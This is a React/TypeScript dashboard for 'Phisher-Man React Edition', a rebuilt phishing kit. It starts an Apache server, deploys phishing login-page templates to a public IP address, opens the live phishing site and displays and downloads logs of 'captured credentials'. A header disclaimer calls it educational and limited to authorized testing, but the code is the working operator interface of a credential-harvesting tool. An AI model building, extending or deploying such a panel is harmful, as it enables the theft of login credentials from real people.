/*
 * Phisher-Man React Edition - Educational Security Research Tool
 * 
 * Rebuilt by: apt_start_latifi
 * Discord: https://discord.gg/KcuMUUAP5T
 * Original Tool: https://github.com/FDX100/Phisher-man
 * 
 * This is a complete rebuild of the original Phisher-Man tool in React and Node.js
 * for educational and authorized security testing purposes only.
 * 
 * IMPORTANT: The original repository had no license. This project is a UI rewrite 
 * and modernization of the original concept. All original phishing templates and 
 * concepts remain attributed to FDX100.
 * 
 * EDUCATIONAL PURPOSE ONLY:
 * - Use only in isolated lab environments
 * - Requires explicit authorization for testing
 * - Designed for cybersecurity education and training
 * - Not for production or public deployment
 * 
 * DISCLAIMER: This tool is for educational and authorized testing purposes only.
 * Users are responsible for complying with all applicable laws and regulations.
 * The authors are not responsible for any misuse of this software.
 */

import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './App.css';
import logoImage from './logo.png';

interface Template {
  id: string;
  name: string;
  logo: string;
  description: string;
}

interface ServerStatus {
  apache: 'running' | 'stopped' | 'unknown';
  lastAction: string;
  timestamp: string;
}

const App: React.FC = () => {
  const [templates, setTemplates] = useState<Template[]>([]);
  const [serverStatus, setServerStatus] = useState<ServerStatus>({
    apache: 'unknown',
    lastAction: '',
    timestamp: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState<{ type: 'success' | 'error' | 'info', text: string } | null>(null);
  const [showLogs, setShowLogs] = useState(false);
  const [logs, setLogs] = useState<string>('');
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [localIP, setLocalIP] = useState<string>('127.0.0.1'); // eslint-disable-line @typescript-eslint/no-unused-vars
  const [publicIP, setPublicIP] = useState<string>('127.0.0.1');
  const [currentTemplate, setCurrentTemplate] = useState<string>('');

  useEffect(() => {
    fetchTemplates();
    fetchServerIP();
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    if (showLogs && autoRefresh) {
      const interval = setInterval(fetchLogs, 5000);
      return () => clearInterval(interval);
    }
  }, [showLogs, autoRefresh]);

  const fetchTemplates = async () => {
    try {
      const response = await axios.get('/api/dashboard');
      setTemplates(response.data.templates);
    } catch (error) {
      console.error('Failed to fetch templates:', error);
      showMessage('error', 'Failed to load templates');
    }
  };

  const fetchServerIP = async () => {
    try {
      const response = await axios.get('/api/server/ip');
      setLocalIP(response.data.localIP || '127.0.0.1');
      setPublicIP(response.data.publicIP || '127.0.0.1');
    } catch (error) {
      console.error('Failed to fetch server IP:', error);
      // Keep default IPs if API fails
    }
  };

  const fetchLogs = async () => {
    try {
      const response = await axios.get('/api/logs');
      setLogs(response.data.logs);
    } catch (error) {
      console.error('Failed to fetch logs:', error);
    }
  };

  const showMessage = (type: 'success' | 'error' | 'info', text: string, details?: string) => {
    const fullText = details ? `${text}\n\n${details}` : text;
    setMessage({ type, text: fullText });
    setTimeout(() => setMessage(null), 10000); // Longer timeout for code display
  };

  const handleServerAction = async (action: string) => {
    setIsLoading(true);
    try {
      const response = await axios.post(`/api/server/${action}`);
      if (response.data.success) {
        setServerStatus(prev => ({
          ...prev,
          apache: action === 'start' ? 'running' : action === 'stop' ? 'stopped' : prev.apache,
          lastAction: action,
          timestamp: new Date().toLocaleTimeString()
        }));
        showMessage('success', `Apache ${action} successful`);
      }
    } catch (error) {
      console.error('Server action failed:', error);
      showMessage('error', `Failed to ${action} Apache`);
    } finally {
      setIsLoading(false);
    }
  };

  const deployTemplate = async (templateId: string) => {
    setIsLoading(true);
    try {
      const response = await axios.post('/api/build-scam', {
        scamName: templateId
      });
      
      if (response.data.success) {
        // Update current template and show success message
        setCurrentTemplate(templateId);
        const localURL = response.data.localURL || `http://127.0.0.1/${templateId}/login.html`;
        const publicURL = response.data.publicURL || `http://${publicIP}/${templateId}/login.html`;
        
        showMessage('success', `Template ${templateId} deployed successfully!`, 
          `Public URL: ${publicURL}\nLocal URL: ${localURL}`);
      }
    } catch (error) {
      console.error('Failed to deploy template:', error);
      showMessage('error', `Failed to deploy ${templateId} template`);
    } finally {
      setIsLoading(false);
    }
  };

  const previewTemplate = (templateId: string) => {
    window.open(`/phishing/${templateId}/login.html`, '_blank');
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'running': return 'status-online';
      case 'stopped': return 'status-offline';
      default: return 'status-unknown';
    }
  };

  const downloadLogs = () => {
    const blob = new Blob([logs], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `phisher-logs-${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  if (showLogs) {
    return (
      <div className="app">
        <div className="container">
          {/* Header */}
          <div className="header fade-in">
            <div className="logo-container">
              <img 
                src={logoImage} 
                alt="Phisher-Man Logo" 
                className="logo-image"
                style={{ 
                  height: '60px', 
                  width: 'auto', 
                  marginRight: '15px'
                }} 
              />
              <div>
                <h1 style={{ margin: 0, fontSize: '2rem' }}>Session Logs</h1>
                <p style={{ margin: '5px 0 0 0' }}>Monitor captured credentials and session data</p>
              </div>
            </div>
          </div>

          {/* Controls */}
          <div className="server-controls fade-in">
            <div className="controls-grid">
              <button
                onClick={() => setShowLogs(false)}
                className="btn btn-primary"
              >
                ← Back to Dashboard
              </button>
              
              <button
                onClick={() => setAutoRefresh(!autoRefresh)}
                className={`btn ${autoRefresh ? 'btn-success' : 'btn-warning'}`}
              >
                {autoRefresh ? '⏸️' : '▶️'} Auto Refresh
              </button>
              
              <button
                onClick={fetchLogs}
                className="btn btn-primary"
              >
                🔄 Refresh Logs
              </button>
              
              <button
                onClick={downloadLogs}
                className="btn btn-warning"
              >
                💾 Download Logs
              </button>
            </div>
          </div>

          {/* Logs Display */}
          <div className="status fade-in">
            <h3>Captured Data</h3>
            <div style={{ 
              background: '#000', 
              color: '#0f0', 
              fontFamily: 'monospace', 
              padding: '20px', 
              borderRadius: '8px',
              minHeight: '400px',
              maxHeight: '600px',
              overflow: 'auto',
              border: '2px solid #0f0'
            }}>
              {logs ? (
                <pre style={{ whiteSpace: 'pre-wrap', margin: 0 }}>
                  {logs}
                </pre>
              ) : (
                <div style={{ textAlign: 'center', padding: '50px', color: '#666' }}>
                  <p>No logs available</p>
                  <p>Deploy a template to start capturing data</p>
                </div>
              )}
            </div>
          </div>

          {/* Footer */}
          <div className="footer fade-in">
            <p>Original Tool: <a href="https://github.com/FDX100/Phisher-man" target="_blank" rel="noopener noreferrer">FDX100/Phisher-man</a></p>
            <p>Rebuilt by: <a href="https://discord.gg/KcuMUUAP5T" target="_blank" rel="noopener noreferrer">apt_start_latifi</a></p>
            <p>Discord: <a href="https://discord.gg/KcuMUUAP5T" target="_blank" rel="noopener noreferrer">https://discord.gg/KcuMUUAP5T</a></p>
            <p>React Edition - Session Logs</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="app">
      <div className="container">
        {/* Header */}
        <div className="header fade-in">
          <div className="logo-container">
            <img 
              src={logoImage} 
              alt="Phisher-Man Logo" 
              className="logo-image"
              style={{ 
                height: '80px', 
                width: 'auto', 
                marginRight: '20px'
              }} 
            />
            <div>
              <h1 style={{ margin: 0, fontSize: '2.5rem' }}>Phisher-Man React Edition</h1>
              <p style={{ margin: '5px 0 0 0', fontSize: '1.1rem' }}>Modern phishing simulation platform with React & Node.js</p>
            </div>
          </div>
        </div>

        {/* Message */}
        {message && (
          <div className={`message message-${message.type} fade-in`}>
            <pre style={{ 
              whiteSpace: 'pre-wrap', 
              fontFamily: 'monospace', 
              fontSize: '12px',
              background: message.type === 'info' ? '#1a1a1a' : 'transparent',
              color: message.type === 'info' ? '#00ff00' : 'inherit',
              padding: message.type === 'info' ? '15px' : '10px',
              borderRadius: '5px',
              border: message.type === 'info' ? '1px solid #00ff00' : 'none',
              maxHeight: '400px',
              overflow: 'auto'
            }}>
              {message.text}
            </pre>
          </div>
        )}

        {/* Server Controls */}
        <div className="server-controls fade-in">
          <h2>Server Management</h2>
          <div className="controls-grid">
            <button
              onClick={() => handleServerAction('start')}
              disabled={isLoading}
              className="btn btn-success"
            >
              {isLoading ? <span className="loading"></span> : '▶️'} Start Apache Service
            </button>
            
            <button
              onClick={() => handleServerAction('stop')}
              disabled={isLoading}
              className="btn btn-danger"
            >
              {isLoading ? <span className="loading"></span> : '⏹️'} Stop Apache Service
            </button>
            
            <button
              onClick={() => handleServerAction('clear')}
              disabled={isLoading}
              className="btn btn-warning"
            >
              {isLoading ? <span className="loading"></span> : '🗑️'} Clear Apache Directory
            </button>
          </div>
        </div>

        {/* Status */}
        <div className="status fade-in">
          <h3>System Status</h3>
          <div className="status-item">
            <span className="status-label">Apache Server:</span>
            <span className={`status-value ${getStatusColor(serverStatus.apache)}`}>
              {serverStatus.apache}
            </span>
          </div>
          <div className="status-item">
            <span className="status-label">Available Templates:</span>
            <span className="status-value status-online">{templates.length}</span>
          </div>
          {serverStatus.lastAction && (
            <div className="status-item">
              <span className="status-label">Last Action:</span>
              <span className="status-value status-info">
                {serverStatus.lastAction} at {serverStatus.timestamp}
              </span>
            </div>
          )}
        </div>

        {/* Templates */}
        <div className="templates-section fade-in">
          <h2>Phishing Templates</h2>
          <div className="templates-grid">
            {templates.map((template) => (
              <div key={template.id} className="template-card">
                <img
                  src={template.logo}
                  alt={template.name}
                  className="template-image"
                  onError={(e) => {
                    const target = e.target as HTMLImageElement;
                    target.src = `data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="120" viewBox="0 0 200 120"><rect width="200" height="120" fill="%23f3f4f6"/><text x="100" y="60" text-anchor="middle" fill="%236b7280" font-family="Arial" font-size="14">${template.name}</text></svg>`;
                  }}
                />
                <h3 className="template-title">{template.name}</h3>
                <p className="template-description">{template.description}</p>
                <div className="template-actions">
                  <button
                    onClick={() => deployTemplate(template.id)}
                    disabled={isLoading}
                    className="btn btn-primary"
                  >
                    {isLoading ? <span className="loading"></span> : '🚀'} Deploy
                  </button>
                  <button
                    onClick={() => previewTemplate(template.id)}
                    className="btn btn-warning"
                  >
                    👁️ Preview
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Quick Actions */}
        <div className="server-controls fade-in">
          <h2>Quick Actions</h2>
          <div className="controls-grid">
            <button
              onClick={() => {
                setShowLogs(true);
                fetchLogs();
              }}
              className="btn btn-primary"
            >
              📋 View Session Logs
            </button>
            
            <button
              onClick={() => {
                if (currentTemplate) {
                  window.open(`http://${publicIP}/${currentTemplate}/login.html`, '_blank');
                } else {
                  showMessage('error', 'No template deployed yet. Please deploy a template first.');
                }
              }}
              className="btn btn-warning"
            >
              🌐 Open Phishing Site {currentTemplate ? `(${currentTemplate})` : ''}
            </button>
          </div>
        </div>

        {/* Footer */}
        <div className="footer fade-in">
          <p>Original Tool: <a href="https://github.com/FDX100/Phisher-man" target="_blank" rel="noopener noreferrer">FDX100/Phisher-man</a></p>
          <p>Rebuilt by: <a href="https://discord.gg/KcuMUUAP5T" target="_blank" rel="noopener noreferrer">apt_start_latifi</a></p>
          <p>Discord: <a href="https://discord.gg/KcuMUUAP5T" target="_blank" rel="noopener noreferrer">https://discord.gg/KcuMUUAP5T</a></p>
          <p>React Edition - Modern phishing simulation platform</p>
        </div>
      </div>
    </div>
  );
};

export default App;